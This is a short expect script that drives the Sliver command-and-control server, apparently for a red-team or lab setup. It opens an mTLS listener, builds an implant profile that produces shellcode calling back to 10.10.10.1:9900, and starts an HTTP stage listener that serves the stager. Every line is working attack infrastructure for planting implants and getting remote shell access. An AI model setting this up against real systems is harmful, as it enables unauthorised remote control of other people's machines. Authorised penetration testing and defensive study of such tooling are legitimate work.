#!/usr/bin/expect -f
spawn sliver-server
expect "sliver >"
send "mtls -l 9900\r"

expect "sliver >"
send "profiles new --mtls 10.10.10.1:9900 -l -f shellcode stager_demo\r"

expect "sliver >"
send "stage-listener -u http://10.10.10.1:9443 -p stager_demo\r"

interact
